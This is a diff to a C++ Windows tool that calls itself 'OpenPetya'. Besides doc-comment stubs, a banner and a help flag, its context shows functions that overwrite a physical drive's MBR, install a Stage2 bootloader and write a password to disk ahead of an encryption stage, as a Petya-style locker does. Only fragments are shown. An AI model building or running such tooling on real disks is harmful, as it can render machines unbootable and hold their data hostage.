@@ -44,6 +44,11 @@ struct stDriveInfo
     std::wstring szPath;
 };
 
+/// @brief 
+/// @param abBuffer 
+/// @param nLength 
+/// @param nOffset 
+/// @return 
 ULONG fnHexdump(const uint8_t* abBuffer, size_t nLength, size_t nOffset = 0)
 {
     ULONG nResult = 0;
@@ -85,6 +90,7 @@ ULONG fnHexdump(const uint8_t* abBuffer, size_t nLength, size_t nOffset = 0)
     return nResult;
 }
 
+/// @brief Disk handling class
 class clsDiskHandle
 {
 public:
@@ -170,6 +176,8 @@ public:
     }
 };
 
+/// @brief 
+/// @return 
 std::vector<stDriveInfo> fnListDrives()
 {
     std::vector<stDriveInfo> lsDrives;
@@ -237,6 +245,8 @@ std::vector<stDriveInfo> fnListDrives()
     return lsDrives;
 }
 
+/// @brief 
+/// @param lsDrives 
 void fnPrintDrives(const std::vector<stDriveInfo>& lsDrives)
 {
     std::wcout << "\nAvailable physical drives:\n";
@@ -252,6 +262,10 @@ void fnPrintDrives(const std::vector<stDriveInfo>& lsDrives)
     }
 }
 
+/// @brief 
+/// @param szPath 
+/// @param abBuffer 
+/// @return 
 bool fnbReadFile(const std::string& szPath, std::vector<uint8_t>& abBuffer)
 {
     std::ifstream fs(szPath, std::ios::binary | std::ios::ate);
@@ -274,6 +288,8 @@ bool fnbReadFile(const std::string& szPath, std::vector<uint8_t>& abBuffer)
     return true;
 }
 
+/// @brief 
+/// @param abBuffer 
 void fnPadToSector(std::vector<uint8_t>& abBuffer)
 {
     size_t rem = abBuffer.size() % SECTOR_SIZE;
@@ -281,6 +297,9 @@ void fnPadToSector(std::vector<uint8_t>& abBuffer)
         abBuffer.resize(abBuffer.size() + SECTOR_SIZE - rem, 0);
 }
 
+/// @brief 
+/// @param abMBR 
+/// @return 
 bool fnbValidateMBR(const std::vector<uint8_t>& abMBR)
 {
     if (abMBR.size() < SECTOR_SIZE)
@@ -289,6 +308,10 @@ bool fnbValidateMBR(const std::vector<uint8_t>& abMBR)
     return abMBR[510] == 0x55 && abMBR[511] == 0xAA;
 }
 
+/// @brief 
+/// @param szDrivePath 
+/// @param szOutPath 
+/// @return 
 bool fnbBackupMBR(const std::wstring& szDrivePath, const std::string& szOutPath)
 {
     std::wcout << L"\n[Backup MBR] Reading sector 0...\n";
@@ -344,6 +367,9 @@ bool fnbBackupMBR(const std::wstring& szDrivePath, const std::string& szOutPath)
     return true;
 }
 
+/// @brief 
+/// @param szDrivePath 
+/// @return 
 bool fnbSaveChainloadBackup(const std::wstring& szDrivePath)
 {
     std::cout << "\n[Chainload backup] Saving original MBR to sector " << BACKUP_MBR_SECTOR << "...\n";
@@ -371,6 +397,10 @@ bool fnbSaveChainloadBackup(const std::wstring& szDrivePath)
     return true;
 }
 
+/// @brief 
+/// @param szDrivePath 
+/// @param szMbrPath 
+/// @return 
 bool fnbWriteMBR(const std::wstring& szDrivePath, const std::string& szMbrPath)
 {
     std::cout << "\n[Write MBR] Installing custom boot code...\n";
@@ -420,6 +450,10 @@ bool fnbWriteMBR(const std::wstring& szDrivePath, const std::string& szMbrPath)
     return true;
 }
 
+/// @brief 
+/// @param szDrivePath 
+/// @param szStage2Path 
+/// @return 
 bool fnbWriteStage2(const std::wstring& szDrivePath, const std::string& szStage2Path)
 {
     std::cout << "\n[Write Stage2] Installing Stage2 bootloader...\n";
@@ -447,6 +481,10 @@ bool fnbWriteStage2(const std::wstring& szDrivePath, const std::string& szStage2
     return true;
 }
 
+/// @brief 
+/// @param szDrivePath 
+/// @param szBackupFile 
+/// @return 
 bool fnbRestoreMBR(const std::wstring& szDrivePath, const std::string& szBackupFile)
 {
     std::cout << "\n[Restore MBR] Restoring original MBR...\n";
@@ -484,6 +522,9 @@ bool fnbRestoreMBR(const std::wstring& szDrivePath, const std::string& szBackupF
     return true;
 }
 
+/// @brief 
+/// @param szDrivePath 
+/// @return 
 bool fnbValidate(const std::wstring& szDrivePath)
 {
     std::cout << "\n[Validate] Reading disk...\n";
@@ -534,6 +575,9 @@ bool fnbValidate(const std::wstring& szDrivePath)
     return true;
 }
 
+/// @brief 
+/// @param szMsg 
+/// @return 
 bool fnbConfirm(const std::string& szMsg)
 {
     std::cout << "\n " << szMsg << " (yes/no): ";
@@ -543,6 +587,9 @@ bool fnbConfirm(const std::string& szMsg)
     return szAns == "yes" || szAns == "YES" || szAns == "y";
 }
 
+/// @brief 
+/// @param szDrivePath 
+/// @return 
 UINT64 fnGetDiskTotalSectors(const std::wstring& szDrivePath)
 {
     HANDLE hFile = CreateFileW(
@@ -566,6 +613,10 @@ UINT64 fnGetDiskTotalSectors(const std::wstring& szDrivePath)
     return (UINT64)geo.DiskSize.QuadPart / 512;
 }
 
+/// @brief 
+/// @param szDrivePath 
+/// @param nTotalSectors 
+/// @return 
 bool fnbWriteDiskSize(const std::wstring& szDrivePath, UINT64 nTotalSectors)
 {
     std::cout << "\n[Write disk size] Sectors: " << nTotalSectors << "\n";
@@ -604,6 +655,9 @@ bool fnbWriteDiskSize(const std::wstring& szDrivePath, UINT64 nTotalSectors)
     return true;
 }
 
+/// @brief 
+/// @param szPrompt 
+/// @return 
 std::string fnInputPassword(const std::string& szPrompt)
 {
     std::cout << szPrompt;
@@ -646,6 +700,10 @@ std::string fnInputPassword(const std::string& szPrompt)
     return szPass;
 }
 
+/// @brief Write password plain text into disk, this password will be erased during the encryption stage
+/// @param szDrivePath 
+/// @param szPassword 
+/// @return 
 bool fnbWritePassword(const std::wstring& szDrivePath, const std::string& szPassword)
 {
     std::cout << "\n[Write password] Storing to sector 59...\n";
@@ -693,6 +751,9 @@ bool fnbWritePassword(const std::wstring& szDrivePath, const std::string& szPass
     return true;
 }
 
+/// @brief Clear metadata (sectors 59-63)
+/// @param szDrivePath 
+/// @return 
 bool fnbClearMetadata(const std::wstring& szDrivePath)
 {
     std::cout << "\n[Clear metadata] Wiping sectors 59-63...\n";
@@ -715,8 +776,28 @@ bool fnbClearMetadata(const std::wstring& szDrivePath)
     return true;
 }
 
+void fnPrintBanner()
+{
+    std::cout << R"(
+       ___     _ __                     ___            _       _  _          
+      / _ \   | '_ \   ___    _ _      | _ \   ___    | |_    | || |  __ _   
+     | (_) |  | .__/  / -_)  | ' \     |  _/  / -_)   |  _|    \_, | / _` |  
+      \___/   |_|__   \___|  |_||_|   _|_|_   \___|   _\__|   _|__/  \__,_|  
+    _|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_| """"|_|"""""| 
+    "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+        )" << std::endl;
+
+    std::cout << "OpenPetya v1.0.0" << std::endl;
+    std::cout << "Author: iss4cf0ng/ISSAC" << std::endl;
+    std::cout << "GitHub: https://github.com/iss4cf0ng/OpenPetya/" << std::endl;
+}
+
+/// @brief Print usage
+/// @param szProg Application name (File name)
 void fnPrintUsage(const char* szProg)
 {
+    fnPrintBanner();
+
     std::wcout  << "\nUsage: " << szProg << " [options]\n\n"
                 << "Options:\n"
                 << "\t--list                            List physical drives\n"
@@ -764,6 +845,11 @@ int _tmain(int argc, char *argv[])
     {
         std::string arg = argv[i];
 
+        if (arg == "--h" || arg == "--help")
+        {
+            fnPrintUsage(argv[0]);
+            return 0;
+        }
         if (arg == "--list")
         {
             bList = true;
